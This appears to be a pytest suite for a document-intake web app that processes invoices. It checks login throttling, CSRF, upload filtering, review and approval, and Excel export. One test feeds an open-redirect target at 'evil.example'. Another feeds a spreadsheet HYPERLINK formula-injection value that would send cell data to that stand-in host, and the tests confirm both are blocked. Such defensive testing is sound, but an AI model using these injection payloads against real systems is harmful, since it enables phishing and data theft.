import io
import re

import httpx
import pytest
from conftest import NOW, add_file, example
from openpyxl import load_workbook

from doc_intake import security
from doc_intake.web import create_app
from doc_intake.worker import Worker

PASSWORD = "correct horse battery"


@pytest.fixture
async def app_env(store, settings):
    admin = await store.add_user("anna@studio.it", "Anna Rossi", security.hash_password(PASSWORD), "admin", NOW)
    reviewer = await store.add_user("luca@studio.it", "Luca", security.hash_password(PASSWORD), "reviewer", NOW)
    app = create_app(store, settings, clock=lambda: NOW)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://panel") as client:
        yield client, store, settings, admin, reviewer


async def login(client, email="anna@studio.it"):
    r = await client.post("/login", data={"email": email, "password": PASSWORD, "next": "/documents"})
    assert r.status_code == 303
    page = await client.get("/documents")
    return re.search(r'name="csrf" value="([^"]+)"', page.text).group(1)


async def read_all(store, settings):
    w = Worker(store, settings, None, clock=lambda: NOW)
    w._last_inbox = NOW
    while await w.tick():
        pass


async def test_everything_needs_login(app_env):
    client, store, settings, *_ = app_env
    doc_id = await add_file(store, settings, "fattura_tipografia_alpina.pdf")
    for url in ("/documents", f"/documents/{doc_id}", f"/documents/{doc_id}/page/1.png",
                f"/documents/{doc_id}/file", "/export.xlsx", "/users"):
        r = await client.get(url)
        assert r.status_code == 303 and r.headers["location"].startswith("/login"), url


async def test_wrong_password_and_too_many_attempts(app_env):
    client, *_ = app_env
    for _ in range(5):
        r = await client.post("/login", data={"email": "anna@studio.it", "password": "nope"})
        assert "Wrong e-mail or password" in r.text
    r = await client.post("/login", data={"email": "anna@studio.it", "password": PASSWORD})
    assert "Too many attempts" in r.text


async def test_login_does_not_redirect_to_another_site(app_env):
    client, *_ = app_env
    r = await client.post("/login", data={"email": "anna@studio.it", "password": PASSWORD,
                                          "next": "//evil.example/phish"})
    assert r.headers["location"] == "/documents"


async def test_upload_accepts_documents_and_rejects_junk(app_env):
    client, store, *_ = app_env
    csrf = await login(client)
    files = [("files", ("fattura.pdf", example("fattura_tipografia_alpina.pdf"), "application/pdf")),
             ("files", ("copy.pdf", example("fattura_tipografia_alpina.pdf"), "application/pdf")),
             ("files", ("invoice.pdf", b"MZ\x90 not a pdf", "application/pdf"))]
    r = await client.post("/upload", data={"csrf": csrf}, files=files)
    assert r.status_code == 303
    page = await client.get(r.headers["location"])
    assert "Uploaded: 1 new, 1 already in the list" in page.text
    assert "invoice.pdf: only PDF, JPG, PNG and WEBP files are accepted" in page.text
    assert (await store.counts())["queued"] == 1


async def test_forms_without_csrf_are_refused(app_env):
    client, store, settings, *_ = app_env
    await login(client)
    doc_id = await add_file(store, settings, "fattura_tipografia_alpina.pdf")
    r = await client.post("/upload", files=[("files", ("a.pdf", example("fattura_tipografia_alpina.pdf"), "x"))])
    assert r.status_code == 403
    r = await client.post(f"/documents/{doc_id}/save", data={"csrf": "forged", "number": "1"})
    assert r.status_code == 403


async def test_review_page_shows_fields_preview_and_original(app_env):
    client, store, settings, *_ = app_env
    doc_id = await add_file(store, settings, "fattura_tipografia_alpina.pdf")
    await read_all(store, settings)
    await login(client)
    page = await client.get(f"/documents/{doc_id}")
    assert 'value="118/2026"' in page.text and "All checks passed" in page.text
    png = await client.get(f"/documents/{doc_id}/page/1.png")
    assert png.headers["content-type"] == "image/png" and png.content.startswith(b"\x89PNG")
    assert (await client.get(f"/documents/{doc_id}/page/2.png")).status_code == 404
    original = await client.get(f"/documents/{doc_id}/file")
    assert original.content == example("fattura_tipografia_alpina.pdf")
    assert "attachment" in original.headers["content-disposition"]


async def test_fix_recheck_and_approve(app_env):
    client, store, settings, *_ = app_env
    doc_id = await add_file(store, settings, "fattura_idraulica_scan.pdf")  # scan, AI off: typed by hand
    await read_all(store, settings)
    csrf = await login(client)
    form = {"csrf": csrf, "doc_type": "invoice", "number": "37", "date": "22/09/2026", "due_date": "2026-10-22",
            "supplier_name": "Idraulica Rossi Snc", "supplier_vat": "IT02188744607", "customer_name": "Laurin",
            "customer_vat": "IT03971560424", "currency": "EUR", "net_total": "215,00", "vat_total": "30,00",
            "gross_total": "245,00", "line_count": "3",
            "line-0-description": "Riparazione caldaia", "line-0-quantity": "1", "line-0-unit_price": "180",
            "line-0-vat_rate": "22", "line-0-amount": "180,00",
            "line-1-description": "Valvola", "line-1-quantity": "1", "line-1-unit_price": "35", "line-1-vat_rate": "22",
            "line-1-amount": "35,00", "action": "approve"}
    r = await client.post(f"/documents/{doc_id}/save", data=form)
    page = await client.get(r.headers["location"])
    assert "Saved, not approved: 1 error(s) left" in page.text
    assert "VAT from the lines is 47.30, the document says 30.00" in page.text
    form.update(vat_total="47,30", gross_total="262,30")
    r = await client.post(f"/documents/{doc_id}/save", data=form)
    doc = await store.get(doc_id)
    assert doc.status == "approved" and doc.errors == 0 and doc.reviewed_by is not None
    assert {e["field"] for e in await store.edits(doc_id)} >= {"number", "vat_total", "lines"}


async def test_approve_anyway_and_reject(app_env):
    client, store, settings, *_ = app_env
    first = await add_file(store, settings, "fattura_idraulica_scan.pdf")
    second = await add_file(store, settings, "scontrino_bar_centrale.jpg")
    await read_all(store, settings)
    csrf = await login(client)
    await client.post(f"/documents/{first}/save", data={"csrf": csrf, "line_count": "0", "action": "approve",
                                                         "accept_errors": "1"})
    assert (await store.get(first)).status == "approved"
    await client.post(f"/documents/{second}/reject", data={"csrf": csrf, "reason": "personal receipt"})
    doc = await store.get(second)
    assert doc.status == "rejected" and doc.reject_reason == "personal receipt"
    r = await client.post(f"/documents/{second}/reread", data={"csrf": csrf})
    assert (await store.get(second)).status == "queued" and r.status_code == 303


async def test_export_has_numbers_dates_and_no_formulas(app_env):
    client, store, settings, *_ = app_env
    doc_id = await add_file(store, settings, "fattura_tipografia_alpina.pdf")
    await read_all(store, settings)
    csrf = await login(client)
    data = {**(await store.get(doc_id)).data}
    form = {f: v for f, v in data.items() if isinstance(v, str)}
    form.update(csrf=csrf, line_count=str(len(data["lines"])), action="approve",
                customer_name='=HYPERLINK("https://evil.example/?"&A1,"cv")')
    for i, line in enumerate(data["lines"]):
        form.update({f"line-{i}-{k}": v for k, v in line.items()})
    await client.post(f"/documents/{doc_id}/save", data=form)
    r = await client.get("/export.xlsx")
    wb = load_workbook(io.BytesIO(r.content))
    docs = wb["Documents"]
    header = [c.value for c in docs[1]]
    row = {h: c for h, c in zip(header, docs[2], strict=True)}
    assert row["Number"].value == "118/2026" and row["Total"].value == 353.8
    assert row["Date"].value.strftime("%d/%m/%Y") == "15/09/2026"
    assert row["Customer"].data_type == "s"  # stored as text, not as a live formula
    assert row["Approved by"].value == "Anna Rossi"
    assert [c.value for c in wb["VAT summary"]["A"]][1:] == [22, "TOTAL"]
    assert wb["Lines"].max_row == 4


async def test_users_page_is_for_admins(app_env):
    client, store, *_ = app_env
    csrf = await login(client, "luca@studio.it")
    assert (await client.get("/users")).status_code == 403
    await client.post("/logout", data={"csrf": csrf})
    csrf = await login(client)
    r = await client.post("/users", data={"csrf": csrf, "email": "marco@studio.it", "name": "Marco",
                                          "password": "short", "role": "reviewer"})
    assert "password of 10" in (await client.get(r.headers["location"])).text
    await client.post("/users", data={"csrf": csrf, "email": "marco@studio.it", "name": "Marco",
                                      "password": "long enough pw", "role": "reviewer"})
    assert await store.user_by_email("MARCO@studio.it") is not None


async def test_security_headers_and_health(app_env):
    client, *_ = app_env
    r = await client.get("/health")
    assert r.json() == {"status": "ok", "queued": 0, "to_review": 0}
    assert r.headers["x-frame-options"] == "DENY" and "default-src 'self'" in r.headers["content-security-policy"]
